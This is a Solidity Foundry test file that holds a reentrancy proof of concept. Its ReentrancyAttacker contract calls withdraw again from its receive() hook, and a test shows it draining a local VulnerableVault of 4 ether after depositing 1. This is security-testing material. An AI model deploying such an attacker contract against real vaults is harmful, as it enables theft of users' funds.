// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

// THE HACKER'S CONTRACT
contract ReentrancyAttacker {
    VulnerableVault public targetVault;

    constructor(address _targetVault) {
        targetVault = VulnerableVault(_targetVault);
    }

    // This function starts the attack chain
    function attack() external payable {
        targetVault.deposit{value: msg.value}();
        targetVault.withdraw();
    }

    // When vault sends ETH here, this code intercepts it and calls withdraw AGAIN.
    receive() external payable {
        if (address(targetVault).balance >= 1 ether) {
            targetVault.withdraw();
        }
    }
}

//  THE SECURITY POC
contract VaultSecurityTest is Test {
    VulnerableVault public vault;
    ReentrancyAttacker public attacker;

    function setUp() public {
        vault = new VulnerableVault();
        attacker = new ReentrancyAttacker(address(vault));
        vm.deal(address(attacker), 1 ether);
    }

    // Prove a normal user can deposit safely
    function testNormalDeposit() public {
        vault.deposit{value: 0.5 ether}();
        assertEq(vault.balances(address(this)), 0.5 ether);
    }

    // Reentrancy attack. This test will pass, proving the contract is breakable!
    function testExploit_DrainVaultViaReentrancy() public {
        // Let's seed the vault with innocent user funds first (3 ether)
        address innocentUser = address(0xABC);
        vm.deal(innocentUser, 3 ether);
        vm.prank(innocentUser);
        vault.deposit{value: 3 ether}();

        // check vault balance starts at 3 ETH
        assertEq(address(vault).balance, 3 ether);

        // Attacker launches attack with only 1 ETH
        attacker.attack{value: 1 ether}();

        // The attack worked! The attacker successfully drained all 4 ETH from the vault
        assertEq(address(vault).balance, 0);
        assertEq(address(attacker).balance, 4 ether);
    }
}
